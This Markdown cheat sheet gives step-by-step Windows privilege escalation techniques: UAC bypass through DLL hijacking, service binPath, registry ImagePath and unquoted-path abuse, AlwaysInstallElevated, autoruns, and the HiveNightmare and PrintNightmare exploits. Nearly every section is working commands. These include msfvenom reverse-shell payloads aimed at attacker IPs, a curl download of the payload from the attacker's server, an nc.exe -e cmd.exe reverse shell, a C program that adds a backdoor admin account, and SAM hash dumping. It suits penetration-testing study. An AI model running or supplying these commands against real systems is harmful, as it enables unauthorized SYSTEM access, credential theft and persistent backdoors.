# ‚úÖ Windows Privilege Escalation ‚Äì Attacking the OS (Cheat Sheet)

---

## üéØ Quick Wins
- [ ] **UAC Bypass** ‚Üí DLL hijacking with auto-elevating binaries
- [ ] **Weak File Permissions** ‚Üí Replace service binaries ‚Üí SYSTEM
- [ ] **Weak Service Permissions** ‚Üí Modify binPath ‚Üí SYSTEM
- [ ] **Unquoted Service Paths** ‚Üí Drop malicious EXE in writable path
- [ ] **Weak Registry Permissions** ‚Üí Change ImagePath ‚Üí SYSTEM
- [ ] **Autoruns & Scheduled Tasks** ‚Üí Hijack startup programs
- [ ] **Kernel Exploits** ‚Üí Use public LPE exploits (HiveNightmare, PrintNightmare)
- [ ] **DLL Hijacking** ‚Üí Abuse DLL load order
- [ ] **Vulnerable Third-Party Services** ‚Üí Exploit custom apps

---

## ‚úÖ Enumeration

```powershell
# Check User & Groups
whoami /user
whoami /groups
net localgroup administrators

# Check Privileges
whoami /priv

# Check UAC Status
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin

# Check Installed things
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# Check Installed Services
wmic service get name,displayname,pathname,startmode | findstr /i "auto"

# Check Installed Updates
systeminfo
wmic qfe list brief
Get-Hotfix
```

## ‚úÖ UAC Bypass (DLL Hijacking via SystemPropertiesAdvanced.exe)

```c
# 1. Generate malicious DLL
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll

# 2. Host DLL
python3 -m http.server 8080

# 3. Download DLL to writable directory
curl http://10.10.14.3:8080/srrstr.dll -o "C:\Users\<user>\AppData\Local\Microsoft\WindowsApps\srrstr.dll"

# 4. Trigger auto-elevating binary
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

## ‚úÖ Weak File Permissions (Service Binary)

```c
# Detect with SharpUp
SharpUp.exe audit

# Confirm Permissions
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

# Exploit: Replace Binary & Start Service
copy /Y malicious.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
sc start SecurityService
```

## ‚úÖ Weak Service Permissions

```c
If our user has permission to change the configuration of a service which runs with SYSTEM privileges, we can change the executable the service uses to one of our own. Potential Rabbit Hole: If you can change a service configuration but cannot stop/start the service, you may not be able to escalate privileges!
```

```c
# 1.Run winPEAS to check for service misconfigurations:
> .\winPEASany.exe quiet servicesinfo

# 2.Note that we can modify the ‚Äúdaclsvc‚Äù service.
# 3.We can confirm this with accesschk.exe:
> .\accesschk.exe /accepteula -uwcqv user daclsvc

# 4.Check the current configuration of the service:
> sc qc daclsvc

# 5.Check the current status of the service:
> sc query daclsvc

# 6.Reconfigure the service to use our reverse shell executable:
> sc config daclsvc binpath="\"C:\PrivEsc\reverse.exe\""
> sc config WindscribeService binpath= "cmd /c net localgroup administrators hacker /add"

# 7. Stop/Start a listener on Kali, and then start the service to trigger the exploit:

> net stop daclsvc  || sc stop daclsvc
> net start daclsvc || sc start daclsvc
```

!! Note , if you want to add user instead of getting a reverse shell you can do the following

```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

```c
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

## ‚úÖ Unquoted Service Paths

```c
Executables in Windows can be run without using their extension (e.g. ‚Äúwhoami.exe‚Äù can be run by just typing ‚Äúwhoami‚Äù).Some executables take arguments, separated by spaces, e.g. someprog.exe arg1 arg2 arg3‚Ä¶ This behavior leads to ambiguity when using absolute paths that are unquoted and contain spaces.

Consider the following unquoted path: C:\Program Files\Some Dir\SomeProgram.exe
To us, this obviously runs SomeProgram.exe. To Windows, C:\Program could be
the executable, with two arguments: ‚ÄúFiles\Some‚Äù and ‚ÄúDir\ SomeProgram.exe‚Äù
Windows resolves this ambiguity by checking each of the possibilities in turn.
If we can write to a location Windows checks before the actual executable, we
can trick the service into executing it instead.
```

> **Method 1**

```c
# 1.Run winPEAS to check for service misconfigurations:
> .\winPEASany.exe quiet servicesinfo

2.Note that the ‚Äúunquotedsvc‚Äù service has an unquoted path that also contains spaces: C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe

# 3.Confirm this using sc:
> sc qc unquotedsvc

# 4.Use accesschk.exe to check for write permissions:
> .\accesschk.exe /accepteula -uwdq C:\
> .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
> .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted
Path Service\"

# 5.Copy the reverse shell executable and rename it appropriately:
> copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path
Service\Common.exe"

# 6.Start a listener on Kali, and then start the service to trigger the exploit:
> net start unquotedsvc
```

> **Method 2**

```c
# Find Vulnerable Services
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /v "C:\Windows\\" | findstr /v """

# Drop malicious EXE in writable folder (e.g., C:\Program.exe)
```

> **Method 3**

```c
Get-CimInstance -ClassName win32_service | Select Name,State,PathName 
icacls "C:\"
icacls "C:\Program Files\Enterprise Apps"
```

## ‚úÖ Insecure Service Executables

```c
If the original service executable is modifiable by our user, we can simply replace it with our reverse shell executable. Remember to create a backup of the original executable if you are exploiting this in a real system!
```

```c
# 1.Run winPEAS to check for service misconfigurations:
> .\winPEASany.exe quiet servicesinfo

# 2.Note that the ‚Äúfilepermsvc‚Äù service has an executable which appears to be writable by everyone. We can confirm this with accesschk.exe:
> .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"

# 3.Create a backup of the original service executable:
> copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp

# 4.Copy the reverse shell executable to overwrite the service executable:
> copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"

# 5.Start a listener on Kali, and then start the service to trigger the exploit:
> net start filepermsvc
```

## ‚úÖ Weak Registry Permissions

```c
The Windows registry stores entries for each service. Since registry entries can have ACLs, if the ACL is misconfigured, it may be possible to modify a service‚Äôs
configuration even if we cannot modify the service directly.
```

>  Method 1

```c
# 1.Run winPEAS to check for service misconfigurations:
> .\winPEASany.exe quiet servicesinfo

# 2.Note that the ‚Äúregsvc‚Äù service has a weak registry entry. We can confirm this with PowerShell:
PS> Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List

# 3.Alternatively accesschk.exe can be used to confirm:
>.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc

#4.Overwrite the ImagePath registry key to point to our reverse shell executable:
> reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f

# 5.Start a listener on Kali, and then start the service to trigger the exploit:
> net start regsvc
```

> Method 2

```c
# Check for Modifiable Keys
accesschk.exe /accepteula user -kvuqsw hklm\System\CurrentControlSet\services

# Exploit: Change ImagePath
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name ImagePath -Value "C:\Users\Public\nc.exe -e cmd.exe 10.10.10.205 443"
```

## ‚úÖ AlwaysInstallElevated Exploit

```c
MSI files are package files used to install applications. These files run with the permissions of the user trying to install them. Windows allows for these installers to be run with elevated (i.e. admin) privileges. If this is the case, we can generate a malicious MSI file which contains a reverse shell.

The catch is that two Registry settings must be enabled for this to work.
The ‚ÄúAlwaysInstallElevated‚Äù value must be set to 1 for both the local
machine: HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer and the current user: HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer If either of these are missing or disabled, the exploit will not work.
```

> **Method 1**

```c
# 1.Use winPEAS to see if both registry values are set:
> .\winPEASany.exe quiet windowscreds

# 2.Alternatively, verify the values manually:
> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
/v AlwaysInstallElevated

# 3.Create a new reverse shell with msfvenom, this time using the msi format, and save it with the .msi extension:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o reverse.msi

# 4.Copy the reverse.msi across to the Windows VM, start a listener on Kali, and run the installer to trigger the exploit:
> msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

> **Method 2**

```c
# Check keys
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

#If both = 1:

msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi > aie.msi
msiexec /i aie.msi /quiet /qn /norestart
```


## ‚úÖ Autorun Programs

```c
Windows can be configured to run commands at startup, with elevated privileges.
These ‚ÄúAutoRuns‚Äù are configured in the Registry. If you are able to write to an AutoRun executable, and are able to restart the system (or wait for it to be restarted) you may be able to escalate privileges.
```

```c
# 1. Use winPEAS to check for writable AutoRun executables:
> .\winPEASany.exe quiet applicationsinfo

# 2. Alternatively, we could manually enumerate the AutoRun executables:
> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# and then use accesschk.exe to verify the permissions on each one:
> .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

# 3. The ‚ÄúC:\Program Files\Autorun Program\program.exe‚Äù AutoRun executable is writable by Everyone. Create a backup of the original:
> copy "C:\Program Files\Autorun Program\program.exe" C:\Temp

# 4. Copy our reverse shell executable to overwrite the AutoRun executable:
> copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"

5. Start a listener on Kali, and then restart the Windows VM to trigger the exploit. Note that on Windows 10, the exploit appears to run with the privileges of the last logged on user, so log out of the ‚Äúuser‚Äù account and log in as the ‚Äúadmin‚Äù account first.
```

```c
Get-CimInstance Win32_StartupCommand | select Name, Command, Location, User
# Replace writable EXEs or registry keys
```

## ‚úÖ Kernel Exploits

```c
# HiveNightmare (CVE-2021-36934)
icacls c:\Windows\System32\config\SAM
HiveNightmare.exe
secretsdump.py -sam SAM -system SYSTEM -security SECURITY local

# PrintNightmare (CVE-2021-1675)
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser hacker -NewPassword Pwn123! -DriverName "PrintIt"
```

## ‚úÖ DLL Hijacking

```c
Often a service will try to load functionality from a library called a DLL (dynamic-link library). Whatever functionality the DLL provides, will be executed with the same privileges as the service that loaded it. If a DLL is loaded with an absolute path, it might be possible to escalate privileges if that DLL is writable by our user.

A more common misconfiguration that can be used to escalate privileges is if a DLL is missing from the system, and our user has write access to a directory within the PATH that Windows searches for DLLs in. Unfortunately, initial detection of vulnerable services is difficult, and often the entire process is very manual.
```

```c
# 1.Use winPEAS to enumerate non-Windows services:
> .\winPEASany.exe quiet servicesinfo

# 2.Note that the C:\Temp directory is writable and in the PATH. Start by enumerating which of these services our user has stop and start access to:
> .\accesschk.exe /accepteula -uvqc user dllsvc

# 3.The ‚Äúdllsvc‚Äù service is vulnerable to DLL Hijacking. According to the winPEAS output, the service runs the dllhijackservice.exe executable. We can confirm this manually:
> sc qc dllsvc

4.Run Procmon64.exe with administrator privileges. Press Ctrl+L to open the Filter menu.

5.Add a new filter on the Process Name matching dllhijackservice.exe.

6.On the main screen, deselect registry activity and network activity.

# 7.Start the service:
> net start dllsvc

8.Back in Procmon, note that a number of ‚ÄúNAME NOT FOUND‚Äù errors appear, associated with the hijackme.dll file.

9.At some point, Windows tries to find the file in the C:\Temp
directory, which as we found earlier, is writable by our user.

# 10. On Kali, generate a reverse shell DLL named hijackme.dll:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f dll -o
hijackme.dll

# 11. Copy the DLL to the Windows VM and into the C:\Temp directory. Start a
listener on Kali and then stop/start the service to trigger the exploit:

> net stop dllsvc
> net start dllsvc
```

## ‚úÖ Startup Apps

```c
# Note that shortcut files (.lnk) must be used. The following VBScript can be used to create a shortcut file:

Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start
Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save
```

```c
# 1.Use accesschk.exe to check permissions on the StartUpdirectory:
> .\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Star t Menu\Programs\StartUp"

2.Note that the BUILTIN\Users group has write access to this directory.

3.Create a file CreateShortcut.vbs with the VBScript provided in a previous slide. Change file paths if necessary.

# 4.Run the script using cscript:
> cscript CreateShortcut.vbs

5.Start a listener on Kali, then log in as the admin user to
trigger the exploit.
```

## ‚úÖ Installed Applications

```c
Most privilege escalations relating to installed applications are based on misconfigurations we have already covered. Still, some privilege escalations results from things like buffer overflows, so knowing how to identify installed
applications and known vulnerabilities is still important.
```

```c
# Manually enumerate all running programs:
> tasklist /v

# We can also use Seatbelt to search for nonstandard processes:
> .\seatbelt.exe NonstandardProcesses

# winPEAS also has this ability (note the misspelling):
> .\winPEASany.exe quiet procesinfo
```

